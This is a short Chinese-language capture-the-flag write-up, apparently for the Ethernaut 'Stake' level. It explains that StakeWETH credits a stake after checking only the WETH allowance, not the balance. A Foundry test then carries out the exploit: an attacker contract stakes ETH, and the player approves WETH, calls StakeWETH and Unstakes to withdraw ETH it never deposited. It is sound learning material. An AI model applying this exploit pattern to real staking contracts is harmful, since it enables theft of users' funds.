漏洞点在 StakeWETH 中只检查了 allowance 就更新余额，而实际可能没有足够的余额。但不太能理解题目的要求有什么含义。实现方法是创建一个合约 `StakeETH` 留下余额，player 账户 `approve` 之后 `StakeWETH` 并全部 `Unstake` 就可以了。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Stake.sol";
import "src/levels/StakeFactory.sol";

contract TestStake is BaseTest {
    using SafeMath for uint256;
    Stake private level;

    constructor() public {
        levelFactory = new StakeFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Stake(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        new Attack{value: 0.003 ether}(address(level));

        address WETH = level.WETH();
        WETH.call(abi.encodeWithSignature("approve(address,uint256)", address(level), 0.002 ether));
        level.StakeWETH(0.002 ether);
        level.Unstake(0.002 ether);

        vm.stopPrank();
    }
}

contract Attack {
    constructor(address level) payable public {
        level.call{value: 0.003 ether}(abi.encodeWithSignature("StakeETH()"));
    }
}
```

